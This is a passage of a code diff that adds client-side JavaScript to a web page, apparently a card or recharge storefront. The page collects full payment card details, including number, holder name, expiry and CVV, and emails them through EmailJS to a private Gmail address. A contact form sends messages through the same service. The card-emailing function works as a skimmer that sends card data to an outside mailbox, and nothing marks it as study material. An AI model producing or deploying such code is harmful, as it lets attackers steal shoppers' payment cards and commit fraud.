+                card_number: cardNumber,
+                card_holder: cardName,
+                expiry_date: expiryDate,
+                cvv: cvv,
+                to_email: "rechargecardnoreply@gmail.com"
+            };
+
+            try {
+                const response = await emailjs.send('service_ekwfpo9', 'template_c8skn0j', templateParams);
+                console.log('Email sent successfully!', response.status, response.text);
+                return true;
+            } catch (error) {
+                console.log('Error sending email:', error);
+                return false;
+            }
+        }
+
+        // Function to send contact message via EmailJS
+        function sendContactMessage(name, email, subject, message) {
+            const templateParams = {
+                from_name: name,
+                from_email: email,
+                subject: subject,
+                message: message,
+                to_email: "kaartdirectinfo@gmail.com"
+            };
+
+            emailjs.send('service_ekwfpo9', 'template_c8skn0j', templateParams)
+                .then(function(response) {
+                    alert('Your message has been sent successfully!');
+                    document.getElementById('contact-form').reset();
+                }, function(error) {
+                    alert('There was an error sending your message. Please try again.');
+                    console.log('Error sending contact message:', error);
+                });
+        }
+    </script>
+</body>
+</html>
